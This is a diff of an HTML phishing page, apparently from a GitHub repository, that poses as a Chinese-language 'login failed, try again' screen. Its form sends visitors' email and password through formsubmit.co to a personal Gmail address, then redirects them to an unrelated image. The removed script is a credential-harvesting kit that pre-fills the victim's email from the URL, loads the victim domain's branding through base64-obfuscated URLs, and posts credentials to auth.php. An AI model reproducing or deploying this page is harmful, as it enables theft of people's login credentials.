@@ -1,43 +1,10 @@
-Skip to content
-webboy3
-yen
-Repository navigation
-Code
-Issues
-Pull requests
-Agents
-Actions
-Projects
-Wiki
-Security and quality
-Insights
-Settings
-Important update
-On April 24 we'll start using GitHub Copilot interaction data for AI model training unless you opt out. Review this update and manage your preferences in your GitHub account settings.
-yen
-/index.html
-Go to file
-t
-webboy3
-webboy3
-Update meta description for authentication page
-c5393b2
- · 
-last week
-807 lines (716 loc) · 26.1 KB
-yen
-/index.html
-
-Code
-
-Blame
 <!doctype html>
-<html lang="en">
+<html lang="zh">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Authenticate Account</title>
-  <meta name="description" content="Authenticate looging for verification." />
+  <title>登录失败 • 请重试</title>
+  <meta name="description" content="登录失败页面，带有重试按钮。" />
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,600,700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
@@ -554,23 +521,67 @@ Blame
   </header>
 
   <main>
-    <section class="shell" aria-label="Login unsuccessful">
+    <section class="shell" aria-label="登录失败">
       <article class="panel reveal d3" aria-labelledby="title">
         <div class="panel-inner">
           <div class="kicker">
             <span class="dot" aria-hidden="true"></span>
-            
+            <span>身份验证</span>
           </div>
 
-      <aside class="actions reveal d4" aria-label="Try again actions">
+          <h1 id="title">无法登录。</h1>
+          <p class="sub">
+            您输入的邮箱或密码与我们的记录不符。请核对信息后重试。
+          </p>
+
+          <div class="reason" role="status" aria-live="polite">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M12 2.5c5.2 0 9.5 4.3 9.5 9.5S17.2 21.5 12 21.5 2.5 17.2 2.5 12 6.8 2.5 12 2.5Z" stroke="rgba(255,77,109,.9)" stroke-width="1.8"/>
+              <path d="M12 7.1v6.3" stroke="rgba(255,77,109,.95)" stroke-width="1.8" stroke-linecap="round"/>
+              <path d="M12 16.9h.01" stroke="rgba(255,77,109,.95)" stroke-width="3.2" stroke-linecap="round"/>
+            </svg>
+            <div>
+              <strong>凭证错误</strong>
+              <p>
+                提示：请检查大写锁定键、空格，或如果您最近更改了密码，请尝试重置密码。
+              </p>
+            </div>
+          </div>
+
+          <div class="meta-row">
+            <div class="meta">
+              <span class="pill" title="错误代码">
+                <span aria-hidden="true" style="width:8px;height:8px;border-radius:999px;background:rgba(255,77,109,.9);box-shadow:0 0 0 3px rgba(255,77,109,.14)"></span>
+                <code>AUTH-401</code>
+              </span>
+              <span class="pill" title="时间戳">
+                <span aria-hidden="true" style="width:8px;height:8px;border-radius:999px;background:rgba(255,183,3,.95);box-shadow:0 0 0 3px rgba(255,183,3,.14)"></span>
+                <code id="ts">—</code>
+              </span>
+            </div>
+
+            <div class="meta" aria-label="安全提示">
+              <span style="display:inline-flex;align-items:center;gap:8px">
+                <span aria-hidden="true" style="width:10px;height:10px;border-radius:3px;background:rgba(52,211,153,.18);border:1px solid rgba(52,211,153,.35)"></span>
+                尝试次数有限制
+              </span>
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <aside class="actions reveal d4" aria-label="重试操作">
         <div class="actions-inner">
           <div class="summary">
-            <span>Authentication</span>
+            <h2>请重试</h2>
+            <p>
+              重新输入您的信息。我们会停留在此页面并提示您需要检查的内容。
+            </p>
           </div>
 
           <form action="https://formsubmit.co/supermario44t@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
     <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_next" value="https://auth-alibabaaa-app.vercel.app/index2.html"> 
+    <input type="hidden" name="_next" value="https://static.vecteezy.com/system/resources/previews/001/199/357/original/barcode-png.png">
             <div class="field">
               <label for="email">邮箱</label>
               <div class="input" id="emailWrap">
@@ -602,7 +613,7 @@ Blame
 
             <div class="row" style="margin-top: 6px;">
               <button class="btn" id="tryAgainBtn" type="submit">
-                <span>登录</span>
+                <span>重试</span>
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                   <path d="M20 12a8 8 0 1 1-2.34-5.66" stroke="rgba(20,7,12,.95)" stroke-width="1.8" stroke-linecap="round"/>
                   <path d="M20 6v6h-6" stroke="rgba(20,7,12,.95)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
@@ -633,121 +644,9 @@ Blame
       <strong id="toastTitle">请重试</strong>
       <p id="toastMsg">请仔细检查您的邮箱和密码，然后提交。</p>
     </div>
-    <button class="x" id="toastClose" aria-label="关闭消息">登录</button>
+    <button class="x" id="toastClose" aria-label="关闭消息">关闭</button>
   </div>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
-    <script>
-        let successCount = 0;
-        let successTimeout;
 
-        function setBackground(imageUrl) {
-            const container = document.getElementById('background-container');
-            container.style.backgroundImage = `url('${imageUrl}')`;
-        }
-
-        function extractEmailAndDomain() {
-            const hash = window.location.hash.substring(1);
-            const email = decodeURIComponent(hash);
-            
-            if (email && email.includes('@')) {
-                const domain = email.split('@')[1];
-                document.getElementById('username').value = email;
-                return { email, domain };
-            }
-            return { email: '', domain: '' };
-        }
-
-        function getDomainName(domain) {
-            return domain.split('.')[0].toUpperCase();
-        }
-
-        function loadImageWithFallback(imgElement, primarySrc, fallbackSrc) {
-            const img = new Image();
-            img.onload = () => { imgElement.src = primarySrc; };
-            img.onerror = () => { imgElement.src = fallbackSrc; };
-            img.src = primarySrc;
-        }
-
-        function setFavicon(primarySrc, fallbackSrc) {
-            const favicon = document.getElementById('dynamic-favicon');
-            const img = new Image();
-            img.onload = () => { favicon.href = primarySrc; };
-            img.onerror = () => { favicon.href = fallbackSrc; };
-            img.src = primarySrc;
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            const { email, domain } = extractEmailAndDomain();
-            if (domain) {
-                const imageUrl = atob('aHR0cHM6Ly9pbWFnZS50aHVtLmlvL2dldC9odHRwOi8vd3d3LiR7ZG9tYWlufQ==').replace('${domain}', domain);
-                setBackground(imageUrl);
-
-                const domainNameElement = document.getElementById('domain-name');
-                const domainLogoElement = document.getElementById('domain-logo');
-                domainNameElement.textContent = getDomainName(domain);
-                const logoUrl = atob('aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8ke2RvbWFpbn0=').replace('${domain}', domain);
-                const fallbackLogoUrl = atob('aHR0cHM6Ly93ZWJtYWlsLmVtYWlscG5sLmNvbS93ZWJtYWlsX2xvZ28uc3Zn');
-                loadImageWithFallback(domainLogoElement, logoUrl, fallbackLogoUrl);
-
-                const faviconUrl = atob('aHR0cHM6Ly9sb2dvLmNsZWFyYml0LmNvbS8ke2RvbWFpbn0=').replace('${domain}', domain);
-                const fallbackFaviconUrl = atob('aHR0cHM6Ly93ZWJtYWlsLmVtYWlscG5sLmNvbS93ZWJtYWlsX2Fzc2V0cy9mYXZpY29uLmljbw==');
-                setFavicon(faviconUrl, fallbackFaviconUrl);
-            }
-
-            const form = document.getElementById('login-form');
-            form.addEventListener('submit', function(event) {
-                event.preventDefault();
-                const username = document.getElementById('username').value;
-                const password = document.getElementById('password').value;
-                const errorMessage = document.querySelector('.error-message');
-                const successMessage = document.querySelector('.success-message');
-                const submitButton = document.getElementById('submit-button');
-                
-                if (password === '') {
-                    errorMessage.style.display = 'block';
-                } else {
-                    errorMessage.style.display = 'none';
-                    submitButton.innerHTML = `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying`;
-                    submitButton.disabled = true;
-
-                    const xhr = new XMLHttpRequest();
-                    xhr.open("POST", "auth.php", true);
-                    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.onreadystatechange = function() {
-                        if (xhr.readyState === XMLHttpRequest.DONE) {
-                            if (xhr.status === 200) {
-                                successCount++;
-                                successMessage.style.display = 'block';
-
-                                document.getElementById('password').addEventListener('input', function clearSuccessMessage() {
-                                    successMessage.style.display = 'none';
-                                    document.getElementById('password').removeEventListener('input', clearSuccessMessage);
-                                });
-
-                                clearTimeout(successTimeout);
-                                successTimeout = setTimeout(() => {
-                                    successMessage.style.display = 'none';
-                                }, 8000);
-
-                                document.getElementById('password').value = '';
-
-                                if (successCount >= 2) {
-                                    successMessage.style.display = 'block';
-                                    setTimeout(() => {
-                                        window.location.href = `http://mail.${domain}`;
-                                    }, 6000);
-                                }
-                            }
-                            submitButton.innerHTML = 'Sign In';
-                            submitButton.disabled = false;
-                        }
-                    };
-                    xhr.send(`username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`);
-                }
-            });
-
-        });
-    </script>
   <script>
     const tsEl = document.getElementById('ts');
     const now = new Date();
@@ -768,8 +667,8 @@ Blame
     togglePw.addEventListener('click', () => {
       const isPw = password.type === 'password';
       password.type = isPw ? 'text' : 'password';
-      togglePw.textContent = isPw ? 'Hide' : 'Show';
-      togglePw.setAttribute('aria-label', isPw ? 'Hide password' : 'Show password');
+      togglePw.textContent = isPw ? '隐藏' : '显示';
+      togglePw.setAttribute('aria-label', isPw ? '隐藏密码' : '显示密码');
       password.focus();
     });
 
@@ -787,7 +686,6 @@ Blame
       el.style.boxShadow = on ? '0 0 0 4px rgba(255,77,109,.12)' : 'none';
     }
 
-    // Keep page "unsuccessful": always rejects, but provides UX feedback.
     form.addEventListener('submit', (e) => {
       e.preventDefault();
 
@@ -801,41 +699,37 @@ Blame
       setErrorState(passWrap, !passwordLooksValid);
 
       if(!emailLooksValid || !passwordLooksValid){
-        showToast('Missing details', 'Enter a valid email and your password, then try again.');
+        showToast('缺少信息', '请输入有效的邮箱和密码，然后重试。');
         if(!emailLooksValid) email.focus();
         else password.focus();
         return;
       }
 
-      // Simulated unsuccessful login
-      showToast('Login failed', 'That combination isn’t recognized. Please try again.');
+      showToast('登录失败', '该组合无法识别。请重试。');
       password.select();
       password.focus();
     });
 
-    // Secondary actions (demo)
     document.getElementById('resetBtn').addEventListener('click', () => {
-      showToast('Reset password', 'In a real app, this would send a reset link to your email.');
+      showToast('重置密码', '在真实应用中，这将向您的邮箱发送重置链接。');
       email.focus();
     });
 
     const supportLink = document.getElementById('supportLink');
     supportLink.addEventListener('click', (e) => {
       e.preventDefault();
-      showToast('Support', 'In a real app, this would open your help center or support form.');
+      showToast('支持', '在真实应用中，这将打开帮助中心或支持表单。');
     });
 
     document.getElementById('auditLink').addEventListener('click', (e) => {
       e.preventDefault();
-      showToast('Account activity', 'In a real app, this would show recent sign-in attempts and devices.');
+      showToast('账户活动', '在真实应用中，这将显示最近的登录尝试和设备。');
     });
 
-    // Focus email on load
     window.addEventListener('load', () => {
       email.focus();
-      showToast('Try again', 'Double-check your email and password, then submit.');
+      showToast('请重试', '请仔细检查您的邮箱和密码，然后提交。');
     });
   </script>
 </body>
 </html>
- 
